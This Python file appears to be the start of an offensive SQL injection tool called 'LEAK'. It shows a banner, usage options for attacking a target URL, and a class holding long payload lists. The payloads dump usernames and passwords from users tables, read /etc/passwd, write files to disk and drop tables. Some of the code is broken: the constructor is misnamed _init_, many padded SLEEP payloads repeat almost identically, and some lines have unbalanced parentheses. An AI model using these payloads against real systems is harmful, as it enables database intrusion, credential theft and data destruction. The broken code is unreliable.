import os
import re
import time
import json
import csv
import argparse
import threading
import queue
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, quote
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import Fore, Style, init
import requests

init(autoreset=True)

BANNER = f"""
{Fore.RED}
██╗     ███████╗ █████╗ ██╗  ██╗
██║     ██╔════╝██╔══██╗██║ ██╔╝
██║     █████╗  ███████║█████╔╝ 
██║     ██╔══╝  ██╔══██║██╔═██╗ 
███████╗███████╗██║  ██║██║  ██╗
╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
{Fore.YELLOW}
LEAK - The Ultimate SQLi Tool
{Fore.CYAN}
  _____
 /     \\
| () () |
 \  ^  /
  |||||
  |||||
{Style.RESET_ALL}
"""

HELP_TEXT = f"""
{Fore.GREEN}
Usage: python attack.py [options]

Options:
  -u, --url      Target URL with parameters
  -m, --method   HTTP method (GET/POST)
  -d, --data     POST data (for POST method)
  -p, --payloads Custom payloads file (one per line)
  --proxy        Proxy to use (e.g., http://127.0.0.1:8080)
  --headers      Custom headers (JSON format)
  --cookies      Session cookies (JSON format)
  --threads      Number of threads (default: 5)
  --delay        Delay between requests
  --timeout      Request timeout
  --retries      Retry attempts for failed requests
  -v, --verbose  Verbose output
  -s, --silent   Silent mode (no console output)
  --output       Output format (txt/json/csv)
  -h, --help     Show this help message
{Style.RESET_ALL}
"""

class SQLiScanner:
    def _init_(self):
        self.payloads = {
            'error_based': [
                "'", "\"", "'\"", "\"'", "`", "´", "\\", 
                "' OR 'a'='a", "\" OR \"a\"=\"a", 
                "' OR 1=1--", "\" OR 1=1--", 
                "' OR 1=1#", "\" OR 1=1#", 
                "' OR 1=1/", "\" OR 1=1/", 
                "' OR 'x'='x", "\" OR \"x\"=\"x",
                "' OR 1=1; DROP TABLE users--", 
                "' OR '1'='1' LIMIT 1--", 
                "' OR 1=1 UNION SELECT 1,2,3--", 
                "' OR 1=1 UNION SELECT 1,@@version,3--", 
                "' OR 1=1 UNION SELECT 1,user(),3--", 
                "' OR 1=1 UNION SELECT 1,database(),3--", 
                "' OR 1=1 UNION SELECT 1,table_name,3 FROM information_schema.tables--", 
                "' OR 1=1 UNION SELECT 1,column_name,3 FROM information_schema.columns--", 
                "' OR 1=1 UNION SELECT 1,concat(username,0x3a,password),3 FROM users--", 
                "' OR 1=1 UNION SELECT 1,load_file('/etc/passwd'),3--", 
                "' OR 1=1 INTO OUTFILE '/tmp/exploit.txt'--", 
                "' OR 1=1 INTO DUMPFILE '/tmp/exploit.txt'--", 
                "' OR 1=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 
                "' OR 1=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x.a)--", 
                "' OR 1=1 AND EXTRACTVALUE(1,CONCAT(0x5c,version()))--", 
                "' OR 1=1 AND UPDATEXML(1,CONCAT(0x5c,version()),1)--", 
                "' OR 1=1 AND (SELECT 1 FROM (SELECT BENCHMARK(10000000,MD5(NOW())))a)--", 
                "' OR 1=1 AND (SELECT 1 FROM (SELECT pg_sleep(5))a--", 
                "' OR 1=1 AND (SELECT 1 FROM (SELECT dbms_pipe.receive_message(('a'),5))a--", 
                "' OR 1=1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)--", 
                "' OR 1=1 AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1)--", 
                "' OR 1=1 AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1)--", 
                "' OR 1=1 AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1)--", 
                "' OR 1=1 AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR 1=1 AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR 1=1 AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR 1=1 AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR 1=1 AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR 1=1 AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR 1=1 AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--"
            ],
            'union_based': [
                "' UNION SELECT null,version(),null--",
                "' UNION SELECT null,database(),null--",
                "' UNION SELECT null,user(),null--",
                "' UNION SELECT null,@@version,null--",
                "' UNION SELECT null,current_user,null--",
                "' UNION SELECT null,table_name,null FROM information_schema.tables--",
                "' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT null,group_concat(table_name),null FROM information_schema.tables WHERE table_schema=database()--",
                "' UNION SELECT null,group_concat(column_name),null FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT null,group_concat(username,0x3a,password),null FROM users--",
                "' UNION SELECT null,name,null FROM sysobjects WHERE xtype='U'--",
                "' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT null,username+':'+password,null FROM users--",
                "' UNION SELECT null,string_agg(table_name,','),null FROM information_schema.tables--",
                "' UNION SELECT null,string_agg(column_name,','),null FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT null,username||':'||password,null FROM users--",
                "' UNION SELECT null,CONCAT(table_name,0x0a,column_name),null FROM information_schema.columns--",
                "' UNION SELECT null,CONCAT(username,0x3a,password,0x3a,email),null FROM users--",
                "' UNION SELECT null,LOAD_FILE('/etc/passwd'),null--",
                "' UNION SELECT null,@@datadir,null--",
                "' UNION SELECT null,@@basedir,null--",
                "' UNION SELECT null,@@plugin_dir,null--",
                "' UNION SELECT null,@@tmpdir,null--",
                "' UNION SELECT null,@@slave_load_tmpdir,null--",
                "' UNION SELECT null,@@innodb_data_home_dir,null--",
                "' UNION SELECT null,@@secure_file_priv,null--",
                "' UNION SELECT null,@@log_error,null--",
                "' UNION SELECT null,@@slow_query_log_file,null--",
                "' UNION SELECT null,@@general_log_file,null--",
                "' UNION SELECT null,@@pid_file,null--",
                "' UNION SELECT null,@@socket,null--",
                "' UNION SELECT null,@@version_compile_os,null--",
                "' UNION SELECT null,@@version_compile_machine,null--",
                "' UNION SELECT null,@@version_comment,null--",
                "' UNION SELECT null,@@version,null--",
                "' UNION SELECT null,@@GLOBAL.version,null--",
                "' UNION SELECT null,@@SESSION.version,null--",
                "' UNION SELECT null,@@GLOBAL.have_ssl,null--",
                "' UNION SELECT null,@@GLOBAL.have_openssl,null--",
                "' UNION SELECT null,@@GLOBAL.have_symlink,null--",
                "' UNION SELECT null,@@GLOBAL.have_dynamic_loading,null--",
                "' UNION SELECT null,@@GLOBAL.have_geometry,null--",
                "' UNION SELECT null,@@GLOBAL.have_rtree_keys,null--",
                "' UNION SELECT null,@@GLOBAL.have_crypt,null--",
                "' UNION SELECT null,@@GLOBAL.have_compress,null--",
                "' UNION SELECT null,@@GLOBAL.have_ssl,null--",
                "' UNION SELECT null,@@GLOBAL.have_query_cache,null--",
                "' UNION SELECT null,@@GLOBAL.have_profiling,null--",
                "' UNION SELECT null,@@GLOBAL.have_statement_timeout,null--"
            ],
            'boolean_blind': [
                "' AND 1=1--", "' AND 1=2--",
                "' OR IF(1=1,1,0)--", "' OR IF(1=2,1,0)--",
                "' AND SLEEP(5)--", "' AND BENCHMARK(10000000,MD5(NOW()))--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--"
            ],
            'time_based': [
                "' OR (SELECT SLEEP(5))--", 
                "' OR (SELECT BENCHMARK(10000000,MD5(NOW())))--", 
                "' OR (SELECT pg_sleep(5))--", 
                "' OR (SELECT 1 FROM pg_sleep(5))--", 
                "' OR (SELECT dbms_pipe.receive_message(('a'),5) FROM dual)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1)--", 
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))--", 
                "' OR (SELECT BENCHMARK(10000000,MD5(NOW())))--", 
                "' OR (SELECT pg_sleep(5)))--", 
                "' OR (SELECT 1 FROM pg_sleep(5)))--", 
                "' OR (SELECT dbms_pipe.receive_message(('a'),5) FROM dual))--"]}